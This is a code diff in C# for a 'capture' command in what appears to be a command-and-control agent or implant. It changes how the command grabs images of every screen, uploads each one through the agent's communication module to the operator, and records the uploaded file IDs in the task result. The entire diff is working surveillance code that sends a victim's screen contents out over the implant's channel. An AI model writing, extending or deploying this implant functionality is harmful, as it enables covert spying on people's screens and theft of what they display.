@@ -17,6 +17,7 @@ namespace Commands
         public override string Name => "capture";
         public override void InnerExecute(AgentTask task, Agent.Models.Agent agent, AgentTaskResult result, CommModule commm)
         {
+            List<TaskFileResult> files = new List<TaskFileResult>();
             int screenId = 1;
             foreach (var screen in Screen.AllScreens)
             {
@@ -30,17 +31,19 @@ namespace Commands
                 ImageConverter converter = new ImageConverter();
                 var buff = (byte[])converter.ConvertTo(image, typeof(byte[]));
 
-                var filename = $"capture/{Guid.NewGuid()}.png";
-                commm.Upload(buff, filename, a =>
+                var filename = $"Capture_{screenId}_{Guid.NewGuid()}.png";
+                var fileId = commm.Upload(buff, filename, a =>
                 {
-                    result.Info = $"Downloading {filename} ({a}%)";
+                    result.Info = $"Uploading {filename} ({a}%)";
                     commm.SendResult(result);
-                }).Wait();
+                }).Result;
 
                 result.Result += $"Screen #{screenId} Captured to {filename}!"+ Environment.NewLine;
-
+                files.Add(new TaskFileResult() { FileId = fileId, FileName = filename });
                 screenId++;
             }
+
+            result.Files.AddRange(files);
         }
     }
 }
